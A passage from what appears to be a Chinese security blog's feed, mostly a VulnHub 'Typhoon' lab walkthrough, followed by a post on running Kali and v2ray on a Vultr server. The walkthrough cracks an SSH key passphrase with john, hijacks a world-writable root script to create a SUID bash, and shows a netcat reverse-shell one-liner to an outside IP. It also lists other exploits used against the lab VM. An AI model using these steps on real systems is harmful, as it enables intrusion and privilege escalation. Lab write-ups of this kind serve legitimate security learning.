AES-128-CBC,C5D65028BD98AC3E19489791F67CA768<br><br>/HkN7JJC6GUhdC9QqGQENXBZ4gmSFyNf3FQujcAG7FudOttBNb5uwYznR/fUHQ3Y<br>zySvHRxesWPSmbH+JnYZabS6J5BfNVLjo6GI/+M0uauh6g7o5FpgVQV1aezGf7VE<br>yH1HBMUarF2ei2ipxPI4bDTBIAOeec9HExagtzHTfryHQOD8qzglUTXRiEYP4/nz<br>y5akLWJp0aicgw8VzqA6JuRYgFvpaV2V7OLUEIwITpxP2q1xrEATY+N9ASM+LIUF<br>hwLfqCxinnzd5ObuF474qluHa2U1IoIFgOjxvQXzN1s6wqIUWPcV2w21QzoJ/cJf<br>Ro5nYZkygcoAHFB1ioQjPHD/HA8wjAPxyP5L1a1zR/PdsxcqqABH7TOJHLVT1ZYa<br>Koh5cmvch9nzTkowQpLnnOPF6smWIYAF6EzLx4Yx1E93w+0Fvvlq6ptRO+ZcNMhy<br>T3s31tqELLM/UbjR3O/dXOVXZuSCPG6okuy7FJ9xAW8k24FmITaHENaIYYzT74Xo<br>fTZjzbwY6QnSb7L+cy70r8CRBi0ESFWyEs2IWyWe8CrsZWtXLkl6O9FVE1ME1geB<br>UaonqZeIfG/fFlsXZTI1jYLvDC3yK1VBdb/fxqZTx+z10KenaKZEvM5IdlS8iBnv<br>Wtbl7v1CrTc9DL924Ul3u1sIhiKvBcu4wtoSEyUcwL08yyVJLrGr5GiKn98ZWECX<br>CAeXPUG2UCNQCYXXsE85u6TBVPGVlsETGtYLvRMwJAtAs79NZbuqIFXmQNGUEP8P<br>nLuw0cdit7sQT6AhIlmgXaqOfjKSS8gfOhVo5sHrvQTshjee0VD8Zgerqql0nqez<br>/yN5kLVn+XWx7SLBHmZnvatFY1KbT3j+y0Cw1kB/ckX+5Ui5fZH3ojauNA+Q5Gtt<br>5rfS4NeAaOYbY5ris+9zprWQ6wI8Yw82psN/sSqI4dVsv9asVkQ7/U7JD7mEEtal<br>u3BuhzhWMHaf+7elorzBTcTs+dTQBGh+wIRGxmhclL5tN7VQ+WJQRKp3b761LnYC<br>LrsWJIpqmvAEpSlvkD01erLu8yUDV2oCC4Y59+1f/xDhX3Qzgy3PYnMTlz7+YVXx<br>klfjpXFgZNJS+H1D8BWR22rkMwQ3x2ylq3QuL8JmAbEAzzUSBXPQY7IQpy8IQSbh<br>XhAopk52jhC3BZ+Pe1wI84AztSwCIcKrnJkoe2lsIu5gOQnCg91DQQqUe+G9TC+o<br>wDXxZMBYWsuZxQ9pN3EMto3iNedkDlMfps6ElplJS6Ci3IGtR2ceHsw/r11j+46j<br>zoM6pBTr8EGDjzintA9a7MhFZ/afXSRYOfxIZA6ijvc21mT838LMeQOHw414t4o7<br>IfpyWmlkfLNJSeWA9KcQ2t+kcM0VuTW0OAHtiNn6qTzClsryBaT2LFSNyMwIRt0p<br>21zYncZu5xc33XwEFZyfi3s/1K+Xw0x4rYqWaGTXQbfXciQgHqGTP0epA54/a+pg<br>edJ7yiGoUAOTvE82vghvTS3Qa9+jSvgGg1m1i1a0bxWT+7YSSD2Io1n+N0mDheAG<br>KCuixP7PfjsNiYLmZoBJIQ30WA1r+4HCQXHDU4o1zpJKy69rOMPyK28MRqI/Kf6X<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>将上述私钥写入本地文件 sshkey 中，ssh 私钥登录试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i sshkey typhoon@192.168.56.121<br></code></pre></td></tr></table></figure><h3 id="john-爆破-ssh-密钥口令"><a href="#john-爆破-ssh-密钥口令" class="headerlink" title="john 爆破 ssh 密钥口令"></a>john 爆破 ssh 密钥口令</h3><p>但是提示需要口令，那就 john 爆破吧，爆破前使用 ssh2john 命令来进行格式转换，将文件写入 rsa_hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ ssh2john sshkey &gt; rsa_hash<br><br>┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt rsa_hash <br>sshkey:789456123<br><br>1 password <span class="hljs-built_in">hash</span> cracked, 0 left<br></code></pre></td></tr></table></figure><p>爆破得到结果，使用密钥登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ ssh -i sshkey typhoon@192.168.56.121     <br>    d888888b db    db d8888b. db   db  .d88b.   .d88b.  d8b   db <br>    `~~88~~<span class="hljs-string">&#x27; `8b  d8&#x27;</span> 88  `8D 88   88 .8P  Y8. .8P  Y8. 888o  88 <br>       88     `8bd8<span class="hljs-string">&#x27;  88oodD&#x27;</span> 88ooo88 88    88 88    88 88V8o 88 <br>       88       88    88~~~   88~~~88 88    88 88    88 88 V8o88 <br>       88       88    88      88   88 `8b  d8<span class="hljs-string">&#x27; `8b  d8&#x27;</span> 88  V888 <br>       YP       YP    88      YP   YP  `Y88P<span class="hljs-string">&#x27;   `Y88P&#x27;</span>  VP   V8P <br>                                                             <br>                 Vulnerable VM By PRISMA CSI - www.prismacsi.com<br><br>WARNING:  Unauthorized access to this system is forbidden and will be<br>prosecuted by law. By accessing this system, you agree that your actions<br>may be monitored <span class="hljs-keyword">if</span> unauthorized usage is suspected.<br><br>                This is a joke of course :))<br>                Please hack me!<br><br>-----------------------------------------------------------------------<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;sshkey&#x27;</span>: <br>sign_and_send_pubkey: no mutual signature supported<br>typhoon@192.168.56.121\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com/</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Sun Jul  2 20:10:31 EEST 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:  0.0                Users logged in:        0</span><br><span class="hljs-string">  Usage of /:   18.9% of 17.34GB   IP address for eth0:    192.168.56.121</span><br><span class="hljs-string">  Memory usage: 40%                IP address for docker0: 172.17.0.1</span><br><span class="hljs-string">  Swap usage:   0%                 IP address for virbr0:  192.168.122.1</span><br><span class="hljs-string">  Processes:    181</span><br><span class="hljs-string"></span><br><span class="hljs-string">  Graph this data and manage this system at:</span><br><span class="hljs-string">    https://landscape.canonical.com/</span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Sun Jul  2 20:10:31 2023 from 192.168.56.106</span><br></code></pre></td></tr></table></figure><p>有个必要有意思的事情，似乎是签名算法不匹配的问题，最后还是要输入密码，而口令恰好也是密码</p><h3 id="可写文件列表"><a href="#可写文件列表" class="headerlink" title="可写文件列表"></a>可写文件列表</h3><p>s 权限的文件列表和 www-data用户相同 ，因此看看可写文件列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:/var/www/html$ find / -<span class="hljs-built_in">type</span> f -writable -not -path <span class="hljs-string">&quot;/var*&quot;</span> -not -path <span class="hljs-string">&quot;/proc*&quot;</span> -not -path <span class="hljs-string">&quot;/sys*&quot;</span> 2&gt;/dev/null<br>/tmp/7ff18ca11a1a43036e852fb2c82c62aa.dat<br>/tmp/b5caab02810ae00ce47f27a6151ab3d2.dat<br>/tmp/f71487e6e9c666dc5b99e37305c00db5.dat<br>/tmp/f0d37d8381109e98099ecb474141283a.dat<br>/tmp/c7007124bd83d0879dc799c95d5b219e.dat<br>/tmp/8c10a35add3f21e11383c7911852072e.dat<br>/tmp/a119d9ddd9ebcf658e28eac9773d7c07.dat<br>/tmp/65d9383ff514cbd01ac65e38806095d7.dat<br>/home/typhoon/.bashrc<br>/home/typhoon/.ssh/id_rsa<br>/home/typhoon/.ssh/id_rsa.pub<br>/home/typhoon/.ssh/known_hosts<br>/home/typhoon/.mysql_history<br>/home/typhoon/.cache/motd.legal-displayed<br>/home/typhoon/.bash_logout<br>/home/typhoon/.bash_history<br>/home/typhoon/.profile<br>/tab/script.sh<br></code></pre></td></tr></table></figure><p>可写文件列表中看到有个&#x2F;tab&#x2F;script.sh 文件，看看这个文件的基本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:~$ <span class="hljs-built_in">ls</span> -liah /tab/script.sh<br>536243 -rwxrwxrwx 1 root root 68 Oct 24  2018 /tab/script.sh<br>typhoon@typhoon:~$ <span class="hljs-built_in">cat</span> /tab/script.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Typhoon is UP!&quot;</span><br><br><span class="hljs-comment">#&lt;typh00n!&gt; P0st_3xpl01t3R_flaqGq &lt;typhoon!&gt;</span><br></code></pre></td></tr></table></figure><p>竟然有个 root 属主的所有用户可读写的 sh 文件，那就简单了，反弹 shell 或者复制 bash 后赋予 s 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cp /bin/bash /tmp/bash;chmod +s /tmp/bash&quot;</span> &gt;/tab/script.sh<br>typhoon@typhoon:~$ /tab/script.sh<br></code></pre></td></tr></table></figure><p>这样我们就获得了一个 s 权限的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:/tmp$ <span class="hljs-built_in">ls</span> -liah<br>total 1.1M<br>655482 drwxrwxrwt  7 root     root     4.0K Jul  3 01:16 .<br>     2 drwxr-xr-x 25 root     root     4.0K Oct 24  2018 ..<br>667536 -rw-rw-rw-  1 www-data www-data   33 Jul  2 17:59 65d9383ff514cbd01ac65e38806095d7.dat<br>667553 -rw-rw-rw-  1 www-data www-data    6 Jul  2 17:59 7ff18ca11a1a43036e852fb2c82c62aa.dat<br>667546 -rw-rw-rw-  1 www-data www-data   33 Jul  2 17:59 8c10a35add3f21e11383c7911852072e.dat<br>667550 -rw-rw-rw-  1 www-data www-data    6 Jul  2 17:59 a119d9ddd9ebcf658e28eac9773d7c07.dat<br>667549 -rw-rw-rw-  1 www-data www-data    6 Jul  2 17:59 b5caab02810ae00ce47f27a6151ab3d2.dat<br>667555 -rwsr-sr-x  1 root     root     994K Jul  2 20:33 bash<br>667552 -rw-rw-rw-  1 www-data www-data    6 Jul  2 17:59 c7007124bd83d0879dc799c95d5b219e.dat<br>667548 -rw-rw-rw-  1 www-data www-data 8.2K Jul  2 17:59 f0d37d8381109e98099ecb474141283a.dat<br>667547 -rw-rw-rw-  1 www-data www-data   28 Jul  2 17:59 f71487e6e9c666dc5b99e37305c00db5.dat<br>667534 prw-r--r--  1 www-data www-data    0 Jul  2 17:22 foo<br>665597 drwxr-xr-x  2 tomcat7  tomcat7  4.0K Jul  2 02:42 hsperfdata_tomcat7<br>659034 drwxrwxrwt  2 root     root     4.0K Jul  2 02:42 .ICE-unix<br>659035 srwx------  1 mongodb  mongodb     0 Jul  2 02:42 mongodb-27017.sock<br>667554 -rw-------  1 root     typhoon  4.0K Jul  2 20:37 .test.swp<br>665596 drwxr-xr-x  2 tomcat7  root     4.0K Jul  2 02:42 tomcat7-tomcat7-tmp<br>667551 drwxrwxrwx  2 www-data www-data 4.0K Jul  2 17:59 translations<br>658262 drwxrwxrwt  2 root     root     4.0K Jul  2 02:42 .X11-unix<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">typhoon@typhoon:/tmp$ ./bash -p<br>bash-4.3<span class="hljs-comment"># whoami</span><br>root<br>bash-4.3<span class="hljs-comment"># id</span><br>uid=1000(typhoon) gid=1000(typhoon) euid=0(root) egid=0(root) <span class="hljs-built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),112(sambashare),125(libvirtd),1000(typhoon)<br>bash-4.3<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:2d:c0:8f brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.121/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe2d:c08f/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:bc:90:00:31 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>4: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 8e:16:41:6c:32:c8 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0<br>       valid_lft forever preferred_lft forever<br>bash-4.3<span class="hljs-comment"># uname -a</span><br>Linux typhoon.local 3.13.0-32-generic <span class="hljs-comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br>bash-4.3<span class="hljs-comment"># cd /root</span><br>bash-4.3<span class="hljs-comment"># ls</span><br>root-flag<br>bash-4.3<span class="hljs-comment"># cat root-flag </span><br>&lt;Congrats!&gt;<br><br>Typhoon_r00t3r!<br><br>&lt;/Congrats!&gt;<br></code></pre></td></tr></table></figure><p>不过这里有个疑问，实际上我第一次运行脚本的时候，得到的文件的属主是 typhoon，我甚至删去了&#x2F;tmp&#x2F;bash，但是最后又莫名奇妙多了个 root 属主的 bash 文件，比较疑惑，等回头重新导入下靶机，然后尝试复现一下，贴一下问题记录</p><p><img src="/pic/8bf6be7d70f75490908c417147aa396c_MD5.png"></p><p>文件的修改时间只相差了 3 min</p><p><img src="/pic/edb6435c1a143cde328c1f1bc80b1a06_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.3<span class="hljs-comment"># ls -liah bash</span><br>667555 -rwsr-sr-x 1 root root 994K Jul  2 20:33 bash<br>bash-4.3<span class="hljs-comment"># stat bash</span><br>  File: ‘bash’<br>  Size: 1017016         Blocks: 1992       IO Block: 4096   regular file<br>Device: fc00h/64512d    Inode: 667555      Links: 1<br>Access: (6755/-rwsr-sr-x)  Uid: (    0/    root)   Gid: (    0/    root)<br>Access: 2023-07-02 21:09:27.916683000 +0300<br>Modify: 2023-07-02 20:33:01.148683000 +0300<br>Change: 2023-07-02 20:33:01.152683000 +0300<br> Birth: -<br></code></pre></td></tr></table></figure><p>看不到文件的创建时间，猜测这个脚本可能是被定时执行了。还可以反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.27.187 8888 &gt;/tmp/f&quot;</span> &gt; script.sh<br>nc -vlp 8888<br></code></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul><li><a href="http://www.infosecworld.cn/index.php?m=content&c=index&a=show&catid=48&id=2583">红队渗透测试之Typhoon——通过十种不同方法拿下 - 网络攻防 - 网信安全世界-中国网信安全领域技术交流和知识分享平台 (infosecworld.cn)</a></li></ul><p>我尝试了 drupal_drupalgeddon2，使用 msf 可以直接 getshell。以下是文章中提到的我没有尝试过的方法</p><ul><li>OpenSSH 2.3 &lt; 7.7 - Username Enumeration 用户名枚举，然后使用 hydra 进行爆破</li><li>phpmoadm 信息泄露</li></ul><p><img src="/pic/4afdd8ff3992c21cb9c5c890b730a8a4_MD5.png"></p><ul><li><p>LotusCMS 漏洞利用：直接使用脚本利用失败，可能是靶机 nc 没有 -e 参数吧，不过文章里用 msf 成功了</p></li><li><p>Tomcat 漏洞利用：尝试使用默认账户登录 tomcat&#x2F;tomcat，登录成功，使用 tomcat_mgr_upload 漏洞</p></li><li><p>Shellshock 漏洞利用：nikto 漏洞扫描发现&#x2F;cgi-bin&#x2F;test.sh 存在 shellshock 漏洞</p></li><li><p>postgres_login 爆破，登录成功后进行文件读写来反弹 shell</p></li><li><p>linux 版永恒之蓝：Samba 3.5+ &lt;4.6.4 &lt;4.5.10 &lt;4.4.14 CVE-2017-7494</p></li><li><p>25 端口 DNS 域传送信息泄露：发现子域名，依次查看进而得到某个子域名下存在 WebCalendar v1.2.4 (08 Aug 2011)，存在漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ dig @192.168.56.122 -t axfr typhoon.local                       <br><br>DiG 9.18.13-1-Debian @192.168.56.122 -t axfr typhoon.local<br>; (1 server found)<br>;; global options: +cmd<br>typhoon.local.          3600    IN      SOA     ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 86400 3600<br>typhoon.local.          3600    IN      NS      ns1.typhoon.local.<br>typhoon.local.          3600    IN      NS      ns2.typhoon.local.<br>calendar.typhoon.local. 3600    IN      CNAME   wwww.typhoon.local.<br>flag.typhoon.local.     3600    IN      TXT     <span class="hljs-string">&quot;g00d_j0b_typh00n!&quot;</span><br>ns1.typhoon.local.      3600    IN      A       192.168.1.5<br>ns2.typhoon.local.      3600    IN      A       192.168.1.6<br>prisma.typhoon.local.   3600    IN      A       192.168.1.8<br>secretmessage.typhoon.local. 3600 IN    TXT     <span class="hljs-string">&quot;prismacsi.com&quot;</span><br>www.typhoon.local.      3600    IN      A       192.168.1.7<br>typhoon.local.          3600    IN      SOA     ns.prismacsi.com. enes.prismacsi.com. 1 3600 600 86400 3600<br>;; Query time: 0 msec<br>;; SERVER: 192.168.56.122<span class="hljs-comment">#53(192.168.56.122) (TCP)</span><br>;; WHEN: Sun Jul 02 22:36:41 EDT 2023<br>;; XFR size: 11 records (messages 1, bytes 338)<br></code></pre></td></tr></table></figure></li><li><p><a href="https://blog.csdn.net/weixin_44519789/article/details/115295118">(1条消息) P5 利用Vulhub复现漏洞 -DNS域传送漏洞_53:dns服务端口(tcp&#x2F;udp 53)漏洞修复_在下小黄的博客-CSDN博客</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTB打靶之 vultr上 kali Linux搭建</title>
    <link href="/2023/07/7f83e81bb133.html"/>
    <url>/2023/07/7f83e81bb133.html</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-打靶之-vultr-上-kali-Linux-搭建"><a href="#HTB-打靶之-vultr-上-kali-Linux-搭建" class="headerlink" title="HTB 打靶之 vultr 上 kali Linux 搭建"></a>HTB 打靶之 vultr 上 kali Linux 搭建</h1><p>之前用别的系统搭过 v2ray ，不过最近有打 htb 的需求，所以希望直接用 kali 系统得了，省时省力，但是关于 vultr 上 kali 搭建 v2ray 的资料比较少，花了挺多时间才达到我满意的效果：平时通过 ssh 登录来打 htb，延迟低速度快，需要界面的操作，利用 v2ray 来流量转发在本地 kali 虚拟机中查看（当然也可以通过 ssh 隧道转发来做，不过不稳定）</p><h2 id="vultr-如何安装-kali-Linux"><a href="#vultr-如何安装-kali-Linux" class="headerlink" title="vultr 如何安装 kali Linux"></a>vultr 如何安装 kali Linux</h2><p>主要参考了这些文章：</p><ul><li><a href="https://cn-sec.com/archives/1663059.html">vultr购置服务器，配置你的随身kali | CN-SEC 中文网</a></li><li><a href="https://gt4404gb.com/archives/669">如何优雅地在VULTR上运行KALI | gt4404gb</a></li><li><a href="https://www.vultrcn.com/9.html">一键测试Vultr现有全部机房的Ping延迟和丢包率 - Vultr中文网 (vultrcn.com)</a></li></ul><p>首先是要上传一个 kali 的 iso，如下图中所示。</p><p><img src="/pic/f13e02d0b3e681ad9aceb97e3330fda1_MD5.png"></p><p>这个过程速度很慢，大概半天才上传成功，使用的是 kali 官网的链接 <code>https://www.kali.org/downloads/</code>。再就是建议使用上面的测延迟脚本，多测几次选个延迟较低的。</p><p>因为不是 vultr 的镜像，所以我们需要进入可视化界面进行系统的安装与配置，这个过程可以去搜一下 kali 的安装教程，基本上没坑。但是记得提示重启的时候，一定要先把系统镜像给删了，要不然又会进入安装流程</p><p><img src="/pic/ecc54772eb327f2c6883be07a4374338_MD5.png"></p><p>等到可视化界面进入系统后，我们通过命令行来安装配置和启动 ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install ssh<br>vi /etc/ssh/sshd_config<br><br></code></pre></td></tr></table></figure><blockquote><p>将 # PasswordAuthentication no 的注释去掉，并且将 NO 修改为 YES &#x2F;&#x2F;kali 中默认是 yes<br>然后# PermitRootLogin 的注释去掉，其后跟着 yes</p></blockquote><p>启动 ssh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/init.d/ssh start<br>update-rc.d ssh <span class="hljs-built_in">enable</span>  //系统自动启动SSH服务<br></code></pre></td></tr></table></figure><p>到这里就可以使用 ssh 登录了，推荐使用 modaxterm，用着比较舒服</p><h2 id="kali-Linux-搭建-v2ray"><a href="#kali-Linux-搭建-v2ray" class="headerlink" title="kali Linux 搭建 v2ray"></a>kali Linux 搭建 v2ray</h2><p>主要参考了 GitHub 上别人的教程，使用的也是第三方安装搭建脚本，担心安全问题的建议使用官方的脚本。</p><ul><li><a href="https://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">V2Ray搭建详细图文教程 · 233boy&#x2F;v2ray Wiki (github.com)</a></li></ul><p>使用下方命令前，先使用 <code>sudo su</code> 来切换到 root 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash &lt;(wget -qO- -o- https://git.io/v2ray.sh)<br></code></pre></td></tr></table></figure><p>脚本安装后会自动创建一个配置，然后可以切换回普通用户 <code>su 用户名</code>，使用下方命令进入管理面板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo v2ray<br></code></pre></td></tr></table></figure><p>根据自己需求在管理面板上进行操作，接下来因为 kali 默认是使用 <code>iptables</code> 的，所以我们要使用下方命令来放行 v2ray 的端口，<code>&lt;port&gt;</code> 替换为 v2ray 配置中的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo iptables -I INPUT -p tcp --dport &lt;port&gt; -j ACCEPT<br></code></pre></td></tr></table></figure><p>我们可以使用 <a href="https://ping.sx/check-port">https://ping.sx/check-port</a> 来确定自己的端口和服务是正常运行的</p><p><img src="/pic/b2874270db689424a959a1761f8e49a9_MD5.png"></p><p>搭建好了之后，本地机器如何连接，如何使用也有个教程 <a href="https://github.com/233boy/v2ray/wiki/V2RayN%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">V2RayN使用教程 · 233boy&#x2F;v2ray Wiki (github.com)</a></p><h2 id="参考链接汇总"><a href="#参考链接汇总" class="headerlink" title="参考链接汇总"></a>参考链接汇总</h2><ul><li><a href="https://ssrvps.org/archives/3397">V2Ray教程 – 月下博客 (ssrvps.org)</a> iptables 放行端口</li><li><a href="https://cn-sec.com/archives/1663059.html">vultr购置服务器，配置你的随身kali | CN-SEC 中文网</a></li><li><a href="https://gt4404gb.com/archives/669">如何优雅地在VULTR上运行KALI | gt4404gb</a></li><li><a href="https://github.com/233boy/v2ray/wiki/V2Ray%E6%90%AD%E5%BB%BA%E8%AF%A6%E7%BB%86%E5%9B%BE%E6%96%87%E6%95%99%E7%A8%8B#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">V2Ray搭建详细图文教程 · 233boy&#x2F;v2ray Wiki (github.com)</a></li><li><a href="https://github.com/233boy/v2ray/wiki/V2RayN%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B">V2RayN使用教程 · 233boy&#x2F;v2ray Wiki (github.com)</a></li></ul><h2 id="Debian-11-转换成-kali-Linux"><a href="#Debian-11-转换成-kali-Linux" class="headerlink" title="Debian 11 转换成 kali Linux"></a>Debian 11 转换成 kali Linux</h2><p>新建用户并赋予 sudo 权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">adduser &lt;username&gt;<br>usermod -a -G sudo &lt;username&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Precious 靶机</title>
    <link href="/2023/07/1a202013a8c5.html"/>
    <url>/2023/07/1a202013a8c5.html</url>
    
